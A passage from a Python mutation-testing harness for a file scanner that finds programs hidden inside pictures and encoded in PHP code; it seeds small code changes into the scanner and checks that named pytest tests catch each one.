        "options.maskAddresses ? withMaskedText(exported) : exported", "exported",
        ("test_page_report.py::test_the_report_can_be_downloaded_as_json",),
    ),
    Mutation(
        "anything around an at sign masked", "scanner/report-export.js",
        "const isAddress = start < at && text.slice(at + 1, end).includes('.');", "const isAddress = true;",
        ("test_page_report.py::test_masking_keeps_everything_but_the_name_before_the_at_sign",),
    ),
    Mutation(
        "the line of a finding not drawn", PAGE_VIEW, "if (excerpt !== '') reason.append(", "if (false) reason.append(",
        ("test_page_report.py::test_a_code_finding_is_drawn_with_its_line_and_a_red_file_with_its_hash",),
    ),
    Mutation(
        "the hash of a red file not drawn", PAGE_VIEW, "if (sha256 !== undefined) row.append(", "if (false) row.append(",
        ("test_page_report.py::test_a_code_finding_is_drawn_with_its_line_and_a_red_file_with_its_hash",),
    ),
    Mutation(
        "empty sections shown", PAGE_VIEW, "if (section) section.hidden = list.children.length === 0;", "if (section) section.hidden = false;",
        ("test_page_report.py::test_sections_without_rows_stay_hidden",),
    ),
    Mutation(
        "the log stays open when the scan is over", PAGE_VIEW, "  view.export.hidden = false;\n  collapseLog(view);\n", "  view.export.hidden = false;\n",
        ("test_page_report.py::test_the_log_shrinks_when_the_scan_is_over_and_opens_again",),
    ),
    Mutation(
        "a line still being written is overtaken", PAGE_VIEW, "    if (closed) return;\n    finishTyping();\n", "    if (closed) return;\n",
        ("test_page_behaviour.py::test_a_line_being_written_is_finished_when_the_next_one_arrives",),
    ),
    Mutation(
        "lines written out for a visitor who asked for less motion", PAGE_VIEW, "if (animate && lines.length === 1) {", "if (lines.length === 1) {",
        ("test_page_behaviour.py::test_lines_go_in_whole_for_a_visitor_who_asked_for_less_motion",),
    ),
    Mutation(
        "a Polish page answered in English", "scanner/messages.js",
        "document.documentElement.lang === 'pl' ? polish : english", "english",
        ("test_page_report.py::test_the_polish_page_speaks_polish",),
    ),
    Mutation(
        "the example's program does not start like one", "scanner/example-copy.js", "const PROGRAM_HEAD = [0x4d, 0x5a, 0x90, 0x00];",
        "const PROGRAM_HEAD = [0xff, 0xd8, 0xff, 0xe0];",
        ("test_page_report.py::test_the_example_is_built_in_the_browser_and_scanned_like_any_file",),
    ),

    # A program inside a media file, away from its first bytes (2026-11-14, after a public
    # comment: a signature check at byte 0 misses a program glued behind a real picture).
    switch_off("program inside media not reported", ENGINE, "inside.found !== null", sample("program_behind_deflated_picture")),
    Mutation(
        "media read with the first bytes not searched", ENGINE, "    inside.feed(head);\n", "",
        (sample("program_behind_small_picture"),),
    ),
    Mutation(
        "media not searched while read through", ENGINE, "inspect: inside.feed }", "inspect: () => {} }",
        (sample("program_behind_stored_picture"), sample("program_in_the_middle_of_a_picture")),
    ),
    Mutation(
        "stored media out of time lose their end too", ENGINE,
        "return entry.method === METHOD_STORED ? storedTail(container, entry, dataStart) : null;", "return null;",
        ("test_nested_limits.py::test_a_stored_picture_out_of_time_still_shows_the_zip_behind_it",),
    ),
    Mutation(
        "MZ believed without its PE mark", "scanner/program-scan.js",
        "if (holdsPeSignature(bytes, at + distance)) return", "if (true) return",
        (sample("program_letters_alone_in_pictures"),),
    ),
    Mutation(
        "PE mark in a later piece never looked at", "scanner/program-scan.js", "    settleWaiting(bytes, keptAt);\n", "",
        (sample("program_with_far_header_behind_picture"),),
    ),
    Mutation(
        "PE mark in a later piece believed unseen", "scanner/program-scan.js",
        "signatureAt >= bytesAt && holdsPeSignature(bytes, signatureAt - bytesAt)", "true",
        (sample("program_letters_alone_in_pictures"),),
    ),
    Mutation(
        "no limit on headers waiting for their mark", "scanner/program-scan.js",
        "} else if (waiting.size < WAITING_LIMIT) {", "} else if (true) {",
        (sample("picture_built_to_exhaust_the_program_search"),),
    ),
    switch_off("stopped search not reported", ENGINE, "inside.gaveUp", sample("picture_built_to_exhaust_the_program_search")),
    Mutation(
        "Linux programs not looked for inside media", "scanner/program-scan.js",
        "if (bytesAt + at > 0 && holdsElfHeader(bytes, at)) return", "if (false) return",
        (sample("linux_program_behind_picture"),),
    ),
    Mutation(
        "ELF class not checked", SIGNATURES, "&& (bytes[at + 4] === 1 || bytes[at + 4] === 2) && (bytes[at + 5]", "&& (bytes[at + 5]",
        (sample("program_letters_alone_in_pictures"),),
    ),
    Mutation(
        "a file handed over whole is searched in one go", "scanner/program-scan.js",
        "const STEP_BYTES = 64 * 1024;", "const STEP_BYTES = Infinity;",
        ("test_program_scan.py::test_a_flood_of_headers_stops_the_search_however_the_file_arrives",),
    ),
    Mutation(
        "header begun at the end of a piece dropped", "scanner/program-scan.js",
        "const keep = Math.min(bytes.length, PROGRAM_HEADER_REACH - 1);", "const keep = 0;",
        ("test_program_scan.py::test_a_program_is_found_however_the_file_is_cut",),
    ),
    Mutation(
        "the file's own first bytes taken for a program inside it", "scanner/program-scan.js",
        "if (distance === null || programAt === 0 || ", "if (distance === null || ",
        ("test_program_scan.py::test_a_program_at_the_very_start_is_left_to_the_first_bytes_check",),
    ),

    # A program or an archive kept in PHP as encoded text (same comment).
    Mutation(
        "program kept as text not looked for", PHP_RULES, "    if (kind !== null) return { signal: 'encoded_program', kind };\n", "",
        (code_shape("base64_program"), code_shape("hex_program"), code_shape("base64_linux_program")),
    ),
    Mutation(
        "archive kept as text not looked for", PHP_RULES,
        "return confirms === undefined || confirms(decodedText) ? { signal: 'encoded_archive', kind } : null;", "return null;",
        (code_shape("base64_archive"),),
    ),
    Mutation(
        "a few signature bytes read as an archive", PHP_RULES, "  if (decodedText.length < PACKED_ARCHIVE_MIN_LENGTH) return null;\n", "",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "gzip told by two bytes", PHP_RULES, "  ['gzip', (text) => text.charCodeAt(2) === 8],\n", "",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "MZ in text believed without its PE mark", SIGNATURES,
        "return distance !== null && holdsPeSignature(bytes, distance) ? 'windows_program' : null;", "return distance !== null ? 'windows_program' : null;",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "program in text has no rule in always-loaded code", CODE_RULES, "    ['encoded_program', 'loaded.encoded_program'],\n", "",
        (code_shape("base64_program"),),
    ),
    Mutation(
        "program in text has no rule in other code", CODE_RULES, "    ['encoded_program', 'unproven.encoded_program'],\n", "",
        (sample("unproven_code"),),
    ),
    Mutation(
        "archive in text has no rule in always-loaded code", CODE_RULES, "    ['encoded_archive', 'loaded.encoded_archive'],\n", "",
        (code_shape("base64_archive"),),
    ),
    Mutation(
        "archive in text has no rule in other code", CODE_RULES, "    ['encoded_archive', 'unproven.encoded_archive'],\n", "",
        (sample("unproven_code"),),
    ),
    *PACKED_DUMP_MUTATIONS,
]


def run_mutation(mutation: Mutation) -> str:
    """Returns '' when every guarding test failed, else a description of what went wrong."""
    with tempfile.TemporaryDirectory() as folder:
        try:
            root = copy_site(Path(folder), {mutation.file: (mutation.find, mutation.replace)})
        except ValueError as error:
            return str(error)

        survived = []
        for node in mutation.must_fail:
            try:
                completed = run_tests(root, [node], TEST_RUN_TIMEOUT_S)
            except subprocess.TimeoutExpired:
                return f"{node} neither passed nor failed within {TEST_RUN_TIMEOUT_S} s"
            if completed.returncode == 0:
                survived.append(node)
            elif completed.returncode != PYTEST_TESTS_FAILED:
                return f"pytest could not run {node} (exit {completed.returncode}): {completed.stdout[-300:]}"
        return f"still passes: {', '.join(survived)}" if survived else ""


def unmutated_failures(chosen: list[Mutation]) -> str:
    """Runs every guarding test once on an untouched copy. A test that fails there would make
    each mutation it guards look caught, so the run stops before any mutation is tried.
    Returns '' when all of them pass, else pytest's summary."""
    nodes = sorted({node for mutation in chosen for node in mutation.must_fail})
    with tempfile.TemporaryDirectory() as folder:
        completed = run_tests(copy_site(Path(folder)), nodes, BASELINE_TIMEOUT_S)
    return "" if completed.returncode == 0 else completed.stdout[-3000:]


def run_tests(root: Path, nodes: list[str], timeout_s: int) -> subprocess.CompletedProcess[str]:
    environment = os.environ | {"SCANNER_SITE_ROOT": str(root), "SCANNER_SCAN_TIMEOUT_MS": MUTATED_SCAN_TIMEOUT_MS}
    return subprocess.run(
        [sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider", "--rootdir", str(REPO_ROOT), *(str(TESTS / node) for node in nodes)],
        capture_output=True, text=True, check=False, env=environment, timeout=timeout_s,
    )


def main() -> int:
    wanted = sys.argv[1:]
    chosen = [mutation for mutation in MUTATIONS if not wanted or any(part in mutation.name for part in wanted)]
    if not chosen:
        print(f"no mutation matches {wanted!r}")
        return 2
    baseline_failures = unmutated_failures(chosen)
    if baseline_failures:
        print(f"guarding tests fail without any mutation, so no catch would mean anything:\n{baseline_failures}")
        return 2
    print(f"baseline: the guarding tests of {len(chosen)} mutations pass on the untouched scanner", flush=True)
    outcomes = []
    with ThreadPoolExecutor(max_workers=PARALLEL_RUNS) as pool:
        for mutation, problem in zip(chosen, pool.map(run_mutation, chosen), strict=True):
            outcomes.append(problem)
            print(f"{'SURVIVED' if problem else 'caught  '}  {mutation.name}{': ' + problem if problem else ''}", flush=True)
    survivors = sum(1 for problem in outcomes if problem)
    print(f"\n{len(chosen) - survivors} of {len(chosen)} mutations caught")
    return 1 if survivors else 0


if __name__ == "__main__":
    sys.exit(main())
